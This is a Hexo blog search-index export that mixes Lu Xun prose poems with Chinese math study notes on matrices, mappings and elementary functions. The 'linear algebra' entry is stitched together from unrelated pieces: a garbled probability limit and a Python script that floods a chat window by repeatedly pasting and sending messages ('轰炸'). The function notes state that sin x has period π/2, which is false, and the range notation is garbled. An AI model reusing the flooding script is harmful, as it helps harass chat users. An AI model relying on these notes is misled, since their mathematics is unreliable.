<p>“我原先被人遗弃在冰谷中，”他答非所问地说，“遗弃我的早已灭亡，消尽了。我也被冰冻冻得要死。倘使你不给我温热，使我重行烧起，我不久就须灭亡。”</p>
<p>“你的醒来，使我欢喜。我正在想着走出冰谷的方法;我愿意携带你去，使你永不冰结，永得燃烧。”</p>
<p>“唉唉! 那么，我将烧完!”</p>
<p>“你的烧完，使我惋惜。我便将你留下，仍在这里罢。”</p>
<p>“唉唉! 那么，我将冻灭了!”</p>
<p>“那么，怎么办呢?”</p>
<p>“但你自己，又怎么办呢?”他反而问。</p>
<p>“我说过了：我要出这冰谷……。”</p>
<p>“那我就不如烧完!”</p>
<p>他忽而跃起，如红彗星，并我都出冰谷口外。有大石车突然驰来，我终于碾死在车轮底下，但我还来得及看见那车就坠入冰谷中。</p>
<p>“哈哈!你们是再也遇不着死火了!”我得意地笑着说，仿佛就愿意这样似的。</p>
]]></content>
      <categories>
        <category>文学</category>
      </categories>
      <tags>
        <tag>鲁迅</tag>
      </tags>
  </entry>
  <entry>
    <title>淡淡的血痕</title>
    <url>/note//%E6%B7%A1%E6%B7%A1%E7%9A%84%E8%A1%80%E7%97%95%E4%B8%AD.html</url>
    <content><![CDATA[<center>
——记念几个死者和生者和未生者——
</center>
<span id="more"></span>
<p>目前的造物主，还是一个怯弱者。</p>
<p>他暗暗地使天变地异，却不敢毁灭一个这地球;暗暗地使生物衰亡，却不敢长存一切尸体;暗暗地使人类流血，却不敢使血色永远鲜秾;暗暗地使人类受苦，却不敢使人类永远记得。</p>
<p>他专为他的同类——人类中的怯弱者设想，用废墟荒坟来衬托华屋，用时光来冲淡苦痛和血痕;日日斟出一杯微甘的苦酒，不太少，不太多，以能微醉为度，递给人间，使饮者可以哭，可以歌，也如醒，也如醉，若有知，若无知，也欲死，也欲生。他必须使一切也欲生;他还没有灭尽人类的勇气。</p>
<p>几片废墟和几个荒坟散在地上，映以淡淡的血痕，人们都在其间咀嚼着人我的渺茫的悲苦。但是不肯吐弃，以为究竟胜于空虚，各各自称为“天之缪民”，以作咀嚼着人我的渺茫的悲苦的辩解，而且悚息着静待新的悲苦的到来。新的，这就使他们恐惧，而又渴欲相遇。</p>
<p>这都是造物主的良民。他就需要这样。叛逆的猛士出于人间;他屹立着，洞见一切已改和现有的废墟和荒坟，记得一切深广和久远的苦痛，正视一切重叠淤积的凝血，深知一切已死，方生，将生和未生。他看透了造化的把戏;他将要起来使人类苏生，或者使人类灭尽，这些造物主的良民们。</p>
<p>造物主，怯弱者，羞惭了，于是伏藏。</p>
<p>天地在猛士的眼中于是变色。</p>
]]></content>
      <categories>
        <category>文学</category>
      </categories>
      <tags>
        <tag>鲁迅</tag>
      </tags>
  </entry>
  <entry>
    <title>线性代数</title>
    <url>/note//%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0.html</url>
    <content><![CDATA[<h1 id="线性代数">线性代数</h1>
<h2 id="矩阵">矩阵</h2>
<p>定义: 数学上，一个m*n的矩阵是一个由m行（row)n列（column）元素排列成的矩形阵列 <span id="more"></span> 以下是一个由9个数字元素构成的3行3列的矩阵</p>
<p><span class="math display">\[lim_{1\to+\infty}P(|\frac{1}{n}\sum_i^nX_i-\mu|&lt;\epsilon)=1, i=1,...,n\]</span></p>
<p><span class="math display">\[
\left[
 \begin{matrix}
   1 &amp; 2 &amp; 3 \\
   4 &amp; 5 &amp; 6 \\
   7 &amp; 8 &amp; 9
  \end{matrix}
  \right]\tag{1}
\]</span></p>
<p>以下是一个由m*n个数字元素构成的m行n列的矩阵 <span class="math display">\[
\left[
\begin{matrix}
 1      &amp; 2       &amp; 4    &amp; \cdots  \\
 7      &amp; 6       &amp; 5     &amp; \cdots \\
 5 &amp; 9  &amp;8  &amp;\cdots\\
  \vdots     &amp; \vdots     &amp; \vdots  &amp; \ddots    \\
\end{matrix}
\right]\tag{2}
\]</span> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> win32gui</span><br><span class="line"><span class="keyword">import</span> win32con</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&quot;color a&quot;</span>)</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">times = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入次数:&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;请将鼠标放在需要轰炸的对话窗口&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">5</span>)</span><br><span class="line">handle = win32gui.WindowFromPoint(win32gui.GetCursorPos())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;句柄获取成功&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">0.25</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\033[1;31;40mFire! \033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">while</span> i &lt; times:</span><br><span class="line">    win32gui.PostMessage(handle, win32con.WM_PASTE, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    win32gui.PostMessage(handle, win32con.WM_KEYDOWN, win32con.VK_RETURN, <span class="number">0</span>)</span><br><span class="line">    win32gui.PostMessage(handle, win32con.WM_KEYUP, win32con.VK_RETURN, <span class="number">0</span>)</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    time.sleep(<span class="number">2</span>)  <span class="comment"># 括号内数字为时间间隔，自行修改</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\033[1;32;40mMission complete\033[0m&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure> [^1]:为了简便,这里使用了尽可能小的矩阵</p>
]]></content>
      <categories>
        <category>数学</category>
      </categories>
      <tags>
        <tag>数学</tag>
      </tags>
  </entry>
  <entry>
    <title>映射</title>
    <url>/note//%E6%98%A0%E5%B0%84.html</url>
    <content><![CDATA[<h1 id="定义">定义</h1>
<p>设<span class="math inline">\(X,Y\)</span>是两个非空集合,如果存在一个法则<span class="math inline">\(f\)</span>使得对<span class="math inline">\(X\)</span>中的每个元素<span class="math inline">\(X\)</span>按法则<span class="math inline">\(f\)</span>,在<span class="math inline">\(Y\)</span>中有唯一确定的元素<span class="math inline">\(y\)</span>与之对应.那么称<span class="math inline">\(f\)</span>为从<span class="math inline">\(X\)</span>到<span class="math inline">\(Y\)</span>的映射记作 <span class="math display">\[f:X\rightarrow Y\]</span> <span id="more"></span> 元素<span class="math inline">\(y\)</span>称为元素<span class="math inline">\(x\)</span>(在映射<span class="math inline">\(f\)</span>下)的像记作<span class="math inline">\(f(x)\)</span>,即<span class="math inline">\(y=f(x)\)</span>;而元素<span class="math inline">\(x\)</span>称为元素<span class="math inline">\(y\)</span>(在映射<span class="math inline">\(f\)</span>下)的一个原像,集合<span class="math inline">\(X\)</span>称为映射<span class="math inline">\(f\)</span>的定义域记作<span class="math inline">\(D_f\)</span>即 <span class="math display">\[D_f=X\]</span> <span class="math inline">\(X\)</span>中所有元素的像所组成的集合称为映射<span class="math inline">\(f\)</span>的值域,记作<span class="math inline">\(R_f\)</span>或<span class="math inline">\(f(x)\)</span>即 <span class="math display">\[R_f=f(x)=| f(x)|x \subset X |\]</span></p>
<p>构成集合的三个要素</p>
<ol type="1">
<li>定义域<span class="math inline">\(D_f=X\)</span></li>
<li>值域<span class="math inline">\(R_f\subset Y\)</span></li>
<li>对应法则<span class="math inline">\(f\)</span>使每个<span class="math inline">\(x\in X\)</span>有唯一确定的<span class="math inline">\(y\)</span>与之对应</li>
</ol>
<p>对于每个<span class="math inline">\(x \in X\)</span>元素<span class="math inline">\(x\)</span>的像<span class="math inline">\(y\)</span>是唯一的;而对于每个<span class="math inline">\(y \in R_f\)</span>元素<span class="math inline">\(y\)</span>的原像不一定是唯一的;映射<span class="math inline">\(f\)</span>的值域<span class="math inline">\(R_f\)</span>是<span class="math inline">\(Y\)</span>的一个子集,即<span class="math inline">\(R_f \subset Y\)</span>不一定<span class="math inline">\(R_f = Y\)</span></p>
<p>映射和满射 * 设<span class="math inline">\(f\)</span>是从集合<span class="math inline">\(X\)</span>到<span class="math inline">\(Y\)</span>的映射,若<span class="math inline">\(R_f =Y\)</span>,即<span class="math inline">\(Y\)</span>中任意元素<span class="math inline">\(y\)</span>都是<span class="math inline">\(X\)</span>中某元素的像,则称<span class="math inline">\(f\)</span>为<span class="math inline">\(X\)</span>到<span class="math inline">\(Y\)</span>上的映射或满射 * 若对<span class="math inline">\(X\)</span>中任意两个不同元素<span class="math inline">\(x_1 \not = x_2\)</span>,他们的像<span class="math inline">\(f(x_1)\not =f(x_2)\)</span>则称<span class="math inline">\(f\)</span>为<span class="math inline">\(X\)</span>到<span class="math inline">\(Y\)</span>上的单射 * 若映射<span class="math inline">\(f\)</span>既是单射又是满射则称<span class="math inline">\(f\)</span>为一一映射(或双射)</p>
]]></content>
      <categories>
        <category>数学</category>
      </categories>
      <tags>
        <tag>高数</tag>
      </tags>
  </entry>
  <entry>
    <title>函数及其基本性质</title>
    <url>/note//%E5%87%BD%E6%95%B0%E5%8F%8A%E5%85%B6%E5%9F%BA%E6%9C%AC%E6%80%A7%E8%B4%A8.html</url>
    <content><![CDATA[<h1 id="函数的概念">函数的概念</h1>
<h2 id="定义">定义</h2>
<p>设非空数集<span class="math inline">\(X,Y\)</span>.则<span class="math inline">\(f:X\rightarrow Y\)</span>映射称为定义在<span class="math inline">\(X\)</span>上的函数,记为</p>
<p><span class="math display">\[y =f(x)\]</span> <span id="more"></span> 1. 定义域<span class="math inline">\(X\)</span>记作<span class="math inline">\(D_f\)</span> 2. 值域<span class="math inline">\(R_f=f(X)\)</span> 3. <span class="math inline">\(f\)</span>为对应法则</p>
<blockquote>
<p>1,3为确定函数的两个要素</p>
</blockquote>
<h2 id="函数的三种表示法">函数的三种表示法</h2>
<ol type="1">
<li>列表法</li>
<li>图形法</li>
<li>解析法(公式法)</li>
</ol>
<h2 id="六大类函数基本初等函数">六大类函数(基本初等函数)</h2>
<ol type="1">
<li>单值函数<span class="math inline">\(:y=c(c为常数)\)</span>
<ul>
<li>定义域<span class="math inline">\((-\infty,+\infty)\)</span></li>
<li>值域<span class="math inline">\(R_f=\left\{C\right\}\)</span></li>
<li>图像过<span class="math inline">\((0,c)\)</span>与<span class="math inline">\(x\)</span>轴平行的直线</li>
</ul></li>
<li>幂函数 <span class="math inline">\(y=x^m\)</span>(m为常数)</li>
<li>指数函数 <span class="math inline">\(y=a^x(a&gt;0且a \not = 1)\)</span></li>
<li>对数函数 <span class="math inline">\(y=log_a^x(a&gt;0 且a \not ={1})\)</span></li>
<li>三角函数
<ol type="1">
<li>正弦函数<span class="math inline">\(y=\sin x\)</span>
<ul>
<li>有界性 ：<span class="math inline">\(\vert \sin x\vert \leq 1\)</span></li>
<li>奇偶性 ：奇函数</li>
<li>周期性 ：周期为<span class="math inline">\(\frac{\pi}{2}\)</span></li>
<li><img src></li>
</ul></li>
</ol></li>
</ol>
]]></content>
      <categories>
        <category>数学</category>
      </categories>
      <tags>
        <tag>高数</tag>
      </tags>
  </entry>
</search>
